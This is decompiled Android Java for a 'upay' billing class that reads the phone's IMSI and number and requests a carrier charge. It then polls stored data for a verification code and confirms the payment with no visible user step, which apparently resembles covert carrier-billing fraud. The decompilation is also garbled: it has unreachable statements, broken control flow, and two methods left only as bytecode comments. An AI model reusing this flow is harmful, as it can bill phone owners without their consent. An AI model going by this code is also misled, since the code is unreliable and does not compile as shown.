package com.upay.billing.engine.rdowap;

import android.content.Context;
import android.os.AsyncTask;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Trade;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.List;
import org.json.JSONException;
import org.json.JSONObject;

public class RdoWebPayTask
  extends AsyncTask
{
  private static final String TAG = "RdoWebPayTask";
  private static String rdoConfirmStr;
  private static String rdoCreateStr;
  private static int rectRdoCfTag = 1;
  private static int rectRdoTag = 1;
  private String charge_request;
  private List cmds;
  private String code = null;
  private String exec_request;
  private Context mContext;
  private Trade mTrade;
  private int resultCode;
  private int status;
  
  public RdoWebPayTask(Context paramContext, Trade paramTrade, List paramList)
  {
    this.mContext = paramContext;
    this.mTrade = paramTrade;
    this.cmds = paramList;
  }
  
  protected Object doInBackground(Object... paramVarArgs)
  {
    paramVarArgs = ((TelephonyManager)this.mContext.getSystemService("phone")).getSubscriberId();
    Object localObject = Util.getString(this.mContext, "mymobile");
    if ((!paramVarArgs.equals(Util.getString(this.mContext, "imsi"))) || (localObject == null) || ("".equals(localObject)))
    {
      Util.saveString(this.mContext, "mymobile", "");
      Util.saveString(this.mContext, "imsi", paramVarArgs);
      Util.getUser(this.mContext);
      localObject = Util.getString(this.mContext, "mymobile");
      if ((!paramVarArgs.equals(Util.getString(this.mContext, "imsi"))) || (localObject == null) || ("".equals(localObject)))
      {
        Util.getPhoneNumber(this.mContext);
        paramVarArgs = new boolean[1];
        paramVarArgs[0] = 0;
      }
    }
    for (;;)
    {
      if (paramVarArgs[0] == 0) {}
      try
      {
        Thread.sleep(5000L);
        localObject = new RdoWebPayTask.1(this, "", paramVarArgs);
        ((HttpRunner)localObject).setDoGet().addParam("minTradeId", this.mTrade.id).addParam("price", String.valueOf(this.mTrade.price));
        ((HttpRunner)localObject).run();
        continue;
        if (this.resultCode != 200000)
        {
          return "verifyfail";
          paramVarArgs = requestRdo(this.mTrade.price + "", Util.getString(this.mContext, "mymobile"));
          try
          {
            this.resultCode = new JSONObject(paramVarArgs).getInt("resultCode");
            Log.i("RdoWebPayTask", "zcresultCode=" + this.resultCode);
            if (this.resultCode == 200000) {
              break label421;
            }
            return "verifyfail";
          }
          catch (JSONException paramVarArgs)
          {
            return "verifyfail";
          }
          paramVarArgs = requestRdo(this.mTrade.price + "", Util.getString(this.mContext, "mymobile"));
          try
          {
            this.resultCode = new JSONObject(paramVarArgs).getInt("resultCode");
            Log.i("RdoWebPayTask", "zcresultCode=" + this.resultCode);
            if (this.resultCode != 200000) {
              return "verifyfail";
            }
          }
          catch (JSONException paramVarArgs)
          {
            return "verifyfail";
          }
        }
        label421:
        i = 30;
        paramVarArgs = new boolean[1];
        paramVarArgs[0] = 0;
        j = i - 1;
        if ((i <= 0) || (paramVarArgs[0] != 0)) {}
      }
      catch (InterruptedException localInterruptedException1)
      {
        try
        {
          for (;;)
          {
            int i;
            int j;
            Thread.sleep(3000L);
            localObject = Util.getString(this.mContext, "verifycode");
            if ((localObject != null) && (!"".equals(localObject)))
            {
              paramVarArgs[0] = 1;
              i = j;
              continue;
              if (j < 0) {
                return "verifyfail";
              }
              paramVarArgs = rdoConfirmHttp(this.mTrade.id, Util.getString(this.mContext, "verifycode"));
              try
              {
                this.code = new JSONObject(paramVarArgs).getString("resultCode");
                Log.i("RdoWebPayTask", "code=" + this.code);
                if (!this.code.equals("200")) {
                  return "payfail";
                }
              }
              catch (JSONException paramVarArgs)
              {
                return "payfail";
              }
              return "paysuccess";
            }
            else
            {
              i = j;
            }
          }
          localInterruptedException1 = localInterruptedException1;
        }
        catch (InterruptedException localInterruptedException2)
        {
          for (;;) {}
        }
      }
    }
  }
  
  protected void onPostExecute(Object paramObject)
  {
    super.onPostExecute(paramObject);
    paramObject = paramObject.toString();
    if ("paysuccess".equals(paramObject))
    {
      UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 200);
      UpayCore.getInstance(this.mContext).tradeUpdated(this.mTrade, ((Cmd)this.cmds.get(0)).key, 1, 200);
      this.exec_request = String.valueOf(200);
      this.charge_request = String.valueOf(200);
    }
    do
    {
      UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "", "result", this.exec_request, "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "rdo", "mt_msg", "", "mt_num", "", "result", this.charge_request, "sn", this.mTrade.id + "01", "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      Util.saveString(this.mContext, "verifycode", "");
      return;
      if ("payfail".equals(paramObject))
      {
        if ((this.code != null) && (!"".equals(this.code))) {
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, Integer.valueOf(this.code).intValue());
        }
        for (;;)
        {
          this.exec_request = String.valueOf(122);
          this.charge_request = String.valueOf(147);
          break;
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, Integer.valueOf(122).intValue());
        }
      }
    } while (!"verifyfail".equals(paramObject));
    if (this.resultCode != 200000) {
      UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, Integer.valueOf(this.status).intValue());
    }
    for (;;)
    {
      this.exec_request = String.valueOf(150);
      this.charge_request = String.valueOf(150);
      break;
      UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, Integer.valueOf(150).intValue());
    }
  }
  
  protected void onPreExecute()
  {
    super.onPreExecute();
  }
  
  /* Error */
  public String rdoConfirmHttp(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: ldc 8
    //   2: ldc_w 316
    //   5: invokestatic 175	android/util/Log:i	(Ljava/lang/String;Ljava/lang/String;)I
    //   8: pop
    //   9: new 318	java/util/ArrayList
    //   12: dup
    //   13: invokespecial 319	java/util/ArrayList:<init>	()V
    //   16: astore_3
    //   17: aload_3
    //   18: new 321	org/apache/http/message/BasicNameValuePair
    //   21: dup
    //   22: ldc 117
    //   24: aload_1
    //   25: invokespecial 324	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   28: invokeinterface 327 2 0
    //   33: pop
    //   34: aload_3
    //   35: new 321	org/apache/http/message/BasicNameValuePair
    //   38: dup
    //   39: ldc_w 329
    //   42: aload_2
    //   43: invokespecial 324	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   46: invokeinterface 327 2 0
    //   51: pop
    //   52: aload_3
    //   53: ldc_w 331
    //   56: invokestatic 337	org/apache/http/client/utils/URLEncodedUtils:format	(Ljava/util/List;Ljava/lang/String;)Ljava/lang/String;
    //   59: pop
    //   60: new 339	org/apache/http/client/methods/HttpGet
    //   63: dup
    //   64: new 142	java/lang/StringBuilder
    //   67: dup
    //   68: invokespecial 143	java/lang/StringBuilder:<init>	()V
    //   71: ldc_w 341
    //   74: invokevirtual 150	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   77: aload_3
    //   78: invokevirtual 344	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   81: invokevirtual 153	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   84: invokespecial 345	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   87: astore_3
    //   88: new 347	org/apache/http/impl/client/DefaultHttpClient
    //   91: dup
    //   92: invokespecial 348	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   95: astore 4
    //   97: aload 4
    //   99: invokeinterface 354 1 0
    //   104: ldc_w 356
    //   107: sipush 30000
    //   110: invokestatic 271	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   113: invokeinterface 362 3 0
    //   118: pop
    //   119: aload 4
    //   121: invokeinterface 354 1 0
    //   126: ldc_w 364
    //   129: sipush 30000
    //   132: invokestatic 271	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   135: invokeinterface 362 3 0
    //   140: pop
    //   141: aload 4
    //   143: aload_3
    //   144: invokeinterface 368 2 0
    //   149: astore_3
    //   150: aload_3
    //   151: invokeinterface 374 1 0
    //   156: invokeinterface 379 1 0
    //   161: sipush 200
    //   164: if_icmpne +92 -> 256
    //   167: new 381	java/io/BufferedReader
    //   170: dup
    //   171: new 383	java/io/InputStreamReader
    //   174: dup
    //   175: aload_3
    //   176: invokeinterface 387 1 0
    //   181: invokeinterface 393 1 0
    //   186: invokespecial 396	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   189: invokespecial 399	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   192: astore_3
    //   193: new 401	java/lang/StringBuffer
    //   196: dup
    //   197: invokespecial 402	java/lang/StringBuffer:<init>	()V
    //   200: astore 4
    //   202: aload_3
    //   203: invokevirtual 405	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   206: astore 5
    //   208: aload 5
    //   210: ifnull +25 -> 235
    //   213: aload 4
    //   215: aload 5
    //   217: invokevirtual 408	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   220: pop
    //   221: goto -19 -> 202
    //   224: astore_3
    //   225: aload_0
    //   226: aload_1
    //   227: aload_2
    //   228: invokevirtual 411	com/upay/billing/engine/rdowap/RdoWebPayTask:reRdoConfirmHttp	(Ljava/lang/String;Ljava/lang/String;)V
    //   231: getstatic 413	com/upay/billing/engine/rdowap/RdoWebPayTask:rdoConfirmStr	Ljava/lang/String;
    //   234: areturn
    //   235: aload 4
    //   237: invokevirtual 414	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   240: putstatic 413	com/upay/billing/engine/rdowap/RdoWebPayTask:rdoConfirmStr	Ljava/lang/String;
    //   243: goto -12 -> 231
    //   246: astore_3
    //   247: aload_0
    //   248: aload_1
    //   249: aload_2
    //   250: invokevirtual 411	com/upay/billing/engine/rdowap/RdoWebPayTask:reRdoConfirmHttp	(Ljava/lang/String;Ljava/lang/String;)V
    //   253: goto -22 -> 231
    //   256: ldc_w 416
    //   259: putstatic 413	com/upay/billing/engine/rdowap/RdoWebPayTask:rdoConfirmStr	Ljava/lang/String;
    //   262: goto -31 -> 231
    //   265: astore_3
    //   266: aload_0
    //   267: aload_1
    //   268: aload_2
    //   269: invokevirtual 411	com/upay/billing/engine/rdowap/RdoWebPayTask:reRdoConfirmHttp	(Ljava/lang/String;Ljava/lang/String;)V
    //   272: goto -41 -> 231
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	275	0	this	RdoWebPayTask
    //   0	275	1	paramString1	String
    //   0	275	2	paramString2	String
    //   16	187	3	localObject1	Object
    //   224	1	3	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   246	1	3	localIllegalStateException	IllegalStateException
    //   265	1	3	localIOException	java.io.IOException
    //   95	141	4	localObject2	Object
    //   206	10	5	str	String
    // Exception table:
    //   from	to	target	type
    //   0	202	224	org/apache/http/client/ClientProtocolException
    //   202	208	224	org/apache/http/client/ClientProtocolException
    //   213	221	224	org/apache/http/client/ClientProtocolException
    //   235	243	224	org/apache/http/client/ClientProtocolException
    //   256	262	224	org/apache/http/client/ClientProtocolException
    //   0	202	246	java/lang/IllegalStateException
    //   202	208	246	java/lang/IllegalStateException
    //   213	221	246	java/lang/IllegalStateException
    //   235	243	246	java/lang/IllegalStateException
    //   256	262	246	java/lang/IllegalStateException
    //   0	202	265	java/io/IOException
    //   202	208	265	java/io/IOException
    //   213	221	265	java/io/IOException
    //   235	243	265	java/io/IOException
    //   256	262	265	java/io/IOException
  }
  
  public void reRdoConfirmHttp(String paramString1, String paramString2)
  {
    if (rectRdoCfTag < 4)
    {
      Log.i("RdoWebPayTask", "reconnection:" + rectRdoCfTag);
      rectRdoCfTag += 1;
      rdoConfirmHttp(paramString1, paramString2);
      return;
    }
    rdoConfirmStr = "timeout";
  }
  
  public void reRequestRdo(String paramString1, String paramString2)
  {
    if (rectRdoTag < 4)
    {
      Log.i("RdoWebPayTask", "reconnection:" + rectRdoTag);
      rectRdoTag += 1;
      requestRdo(paramString1, paramString2);
      return;
    }
    rdoCreateStr = "timeout";
  }
  
  /* Error */
  public String requestRdo(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: ldc 8
    //   2: ldc_w 423
    //   5: invokestatic 175	android/util/Log:i	(Ljava/lang/String;Ljava/lang/String;)I
    //   8: pop
    //   9: new 318	java/util/ArrayList
    //   12: dup
    //   13: invokespecial 319	java/util/ArrayList:<init>	()V
    //   16: astore_3
    //   17: aload_3
    //   18: new 321	org/apache/http/message/BasicNameValuePair
    //   21: dup
    //   22: ldc -128
    //   24: aload_1
    //   25: invokespecial 324	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   28: invokeinterface 327 2 0
    //   33: pop
    //   34: aload_3
    //   35: new 321	org/apache/http/message/BasicNameValuePair
    //   38: dup
    //   39: ldc_w 425
    //   42: aload_2
    //   43: invokespecial 324	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   46: invokeinterface 327 2 0
    //   51: pop
    //   52: aload_3
    //   53: ldc_w 331
    //   56: invokestatic 337	org/apache/http/client/utils/URLEncodedUtils:format	(Ljava/util/List;Ljava/lang/String;)Ljava/lang/String;
    //   59: astore_3
    //   60: new 339	org/apache/http/client/methods/HttpGet
    //   63: dup
    //   64: new 142	java/lang/StringBuilder
    //   67: dup
    //   68: invokespecial 143	java/lang/StringBuilder:<init>	()V
    //   71: ldc_w 341
    //   74: invokevirtual 150	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   77: aload_3
    //   78: invokevirtual 150	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   81: invokevirtual 153	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   84: invokespecial 345	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   87: astore_3
    //   88: new 347	org/apache/http/impl/client/DefaultHttpClient
    //   91: dup
    //   92: invokespecial 348	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   95: astore 4
    //   97: aload 4
    //   99: invokeinterface 354 1 0
    //   104: ldc_w 356
    //   107: sipush 30000
    //   110: invokestatic 271	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   113: invokeinterface 362 3 0
    //   118: pop
    //   119: aload 4
    //   121: invokeinterface 354 1 0
    //   126: ldc_w 364
    //   129: sipush 30000
    //   132: invokestatic 271	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   135: invokeinterface 362 3 0
    //   140: pop
    //   141: aload 4
    //   143: aload_3
    //   144: invokeinterface 368 2 0
    //   149: astore_3
    //   150: aload_3
    //   151: invokeinterface 374 1 0
    //   156: invokeinterface 379 1 0
    //   161: sipush 200
    //   164: if_icmpne +92 -> 256
    //   167: new 381	java/io/BufferedReader
    //   170: dup
    //   171: new 383	java/io/InputStreamReader
    //   174: dup
    //   175: aload_3
    //   176: invokeinterface 387 1 0
    //   181: invokeinterface 393 1 0
    //   186: invokespecial 396	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   189: invokespecial 399	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   192: astore_3
    //   193: new 401	java/lang/StringBuffer
    //   196: dup
    //   197: invokespecial 402	java/lang/StringBuffer:<init>	()V
    //   200: astore 4
    //   202: aload_3
    //   203: invokevirtual 405	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   206: astore 5
    //   208: aload 5
    //   210: ifnull +25 -> 235
    //   213: aload 4
    //   215: aload 5
    //   217: invokevirtual 408	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   220: pop
    //   221: goto -19 -> 202
    //   224: astore_3
    //   225: aload_0
    //   226: aload_1
    //   227: aload_2
    //   228: invokevirtual 427	com/upay/billing/engine/rdowap/RdoWebPayTask:reRequestRdo	(Ljava/lang/String;Ljava/lang/String;)V
    //   231: getstatic 421	com/upay/billing/engine/rdowap/RdoWebPayTask:rdoCreateStr	Ljava/lang/String;
    //   234: areturn
    //   235: aload 4
    //   237: invokevirtual 414	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   240: putstatic 421	com/upay/billing/engine/rdowap/RdoWebPayTask:rdoCreateStr	Ljava/lang/String;
    //   243: goto -12 -> 231
    //   246: astore_3
    //   247: aload_0
    //   248: aload_1
    //   249: aload_2
    //   250: invokevirtual 427	com/upay/billing/engine/rdowap/RdoWebPayTask:reRequestRdo	(Ljava/lang/String;Ljava/lang/String;)V
    //   253: goto -22 -> 231
    //   256: ldc_w 416
    //   259: putstatic 421	com/upay/billing/engine/rdowap/RdoWebPayTask:rdoCreateStr	Ljava/lang/String;
    //   262: goto -31 -> 231
    //   265: astore_3
    //   266: aload_0
    //   267: aload_1
    //   268: aload_2
    //   269: invokevirtual 427	com/upay/billing/engine/rdowap/RdoWebPayTask:reRequestRdo	(Ljava/lang/String;Ljava/lang/String;)V
    //   272: goto -41 -> 231
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	275	0	this	RdoWebPayTask
    //   0	275	1	paramString1	String
    //   0	275	2	paramString2	String
    //   16	187	3	localObject1	Object
    //   224	1	3	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   246	1	3	localIllegalStateException	IllegalStateException
    //   265	1	3	localIOException	java.io.IOException
    //   95	141	4	localObject2	Object
    //   206	10	5	str	String
    // Exception table:
    //   from	to	target	type
    //   0	202	224	org/apache/http/client/ClientProtocolException
    //   202	208	224	org/apache/http/client/ClientProtocolException
    //   213	221	224	org/apache/http/client/ClientProtocolException
    //   235	243	224	org/apache/http/client/ClientProtocolException
    //   256	262	224	org/apache/http/client/ClientProtocolException
    //   0	202	246	java/lang/IllegalStateException
    //   202	208	246	java/lang/IllegalStateException
    //   213	221	246	java/lang/IllegalStateException
    //   235	243	246	java/lang/IllegalStateException
    //   256	262	246	java/lang/IllegalStateException
    //   0	202	265	java/io/IOException
    //   202	208	265	java/io/IOException
    //   213	221	265	java/io/IOException
    //   235	243	265	java/io/IOException
    //   256	262	265	java/io/IOException
  }
}
